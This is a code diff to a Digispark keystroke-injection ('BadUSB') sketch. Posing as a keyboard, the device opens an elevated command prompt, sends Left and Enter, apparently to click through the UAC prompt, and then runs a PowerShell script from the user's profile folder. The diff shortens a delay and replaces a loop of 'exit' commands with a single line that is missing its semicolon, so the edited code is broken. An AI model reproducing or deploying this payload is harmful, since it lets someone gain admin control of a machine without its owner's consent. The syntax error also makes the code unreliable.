@@ -20,7 +20,7 @@ void loop() {
   DigiKeyboard.delay(4000);
 
   DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
-  DigiKeyboard.delay(3000);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_LEFT);
   DigiKeyboard.delay(300);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -30,10 +30,6 @@ void loop() {
 
   DigiKeyboard.println("powershell.exe -File \"%USERPROFILE%\\script2.ps1\"");
   DigiKeyboard.delay(4000);
-  for (int i = 0; i < 2; i++)
-  {
-    DigiKeyboard.delay(300);
-    DigiKeyboard.println("exit");
-  }
+  DigiKeyboard.println("exit")
   for(;;){} 
 }
